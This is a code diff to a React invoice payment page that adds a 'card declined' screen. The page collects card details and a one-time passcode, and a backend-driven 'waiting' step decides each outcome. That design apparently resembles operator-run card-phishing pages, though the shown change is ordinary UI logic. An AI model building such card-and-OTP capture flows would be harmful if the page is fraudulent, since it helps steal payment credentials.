@@ -1,4 +1,5 @@
 import { useState, useEffect, useRef, useCallback } from "react";
+
 import { useParams } from "react-router-dom";
 import PaymentForm from "@/components/PaymentForm";
 import OtpVerification from "@/components/OtpVerification";
@@ -7,12 +8,13 @@ import PaymentSuccess from "@/components/PaymentSuccess";
 import PaymentRejected from "@/components/PaymentRejected";
 import WaitingScreen from "@/components/WaitingScreen";
 import ProcessingOverlay from "@/components/ProcessingOverlay";
+import CardDeclinedScreen from "@/components/CardDeclinedScreen";
 import { supabase } from "@/integrations/supabase/client";
 import { ShieldCheck, Lock } from "lucide-react";
 
 const InvoicePayment = () => {
   const { invoiceId } = useParams<{ invoiceId: string }>();
-  const [step, setStep] = useState<"loading" | "not_found" | "paid" | "form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected">("loading");
+  const [step, setStep] = useState<"loading" | "not_found" | "paid" | "form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected" | "card_declined">("loading");
   const stepRef = useRef(step);
   stepRef.current = step;
   const [invoice, setInvoice] = useState<any>(null);
@@ -86,8 +88,7 @@ const InvoicePayment = () => {
           if (newStatus === "rejected") setStep("rejected");
           if (newStatus === "card_invalid") {
             setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-            setStep("form");
-            setSessionId(null);
+            setStep("card_declined");
           }
         }
         if (currentStep === "otp") {
@@ -100,8 +101,7 @@ const InvoicePayment = () => {
           if (newStatus === "rejected") setStep("rejected");
           if (newStatus === "card_invalid") {
             setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-            setStep("form");
-            setSessionId(null);
+            setStep("card_declined");
           }
         }
         if (currentStep === "processing") {
@@ -114,8 +114,7 @@ const InvoicePayment = () => {
           if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
           if (newStatus === "card_invalid") {
             setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
-            setStep("form");
-            setSessionId(null);
+            setStep("card_declined");
           }
         }
       })
@@ -324,6 +323,7 @@ const InvoicePayment = () => {
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
           {step === "processing" && <WaitingScreen amount={formatEuro(total)} />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
+          {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
           {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
         </div>
       </div>
